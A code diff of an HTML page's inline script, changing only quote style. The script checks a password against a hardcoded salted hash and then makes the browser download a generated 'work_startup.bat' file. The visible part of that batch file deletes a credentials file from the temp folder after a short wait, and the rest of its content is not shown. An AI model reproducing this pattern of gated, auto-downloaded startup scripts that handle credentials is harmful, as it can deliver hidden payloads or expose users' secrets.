@@ -52,12 +52,11 @@
 		</div>
 
 		<script>
-			const salt = "Kj7mN3Lp";
-			const correctHash =
-				"ef84615b33d36e6aacd7b5cc71e2de1adb5c64557da555498e693a98f73a2043";
+			const salt = 'Kj7mN3Lp';
+			const correctHash = 'ef84615b33d36e6aacd7b5cc71e2de1adb5c64557da555498e693a98f73a2043';
 
 			function checkPassword() {
-				const password = document.getElementById("password").value;
+				const password = document.getElementById('password').value;
 				const hashedInput = sha256(password + salt);
 
 				if (hashedInput === correctHash) {
@@ -73,18 +72,18 @@ timeout /t 5 > nul
 del "%TEMP%\\credentials.txt"`;
 
 					const blob = new Blob([scriptContent], {
-						type: "text/plain",
+						type: 'text/plain',
 					});
 					const url = URL.createObjectURL(blob);
-					const a = document.createElement("a");
+					const a = document.createElement('a');
 					a.href = url;
-					a.download = "work_startup.bat";
+					a.download = 'work_startup.bat';
 					document.body.appendChild(a);
 					a.click();
 					document.body.removeChild(a);
 					URL.revokeObjectURL(url);
 				} else {
-					alert("Wrong password.");
+					alert('Wrong password.');
 				}
 			}
 		</script>
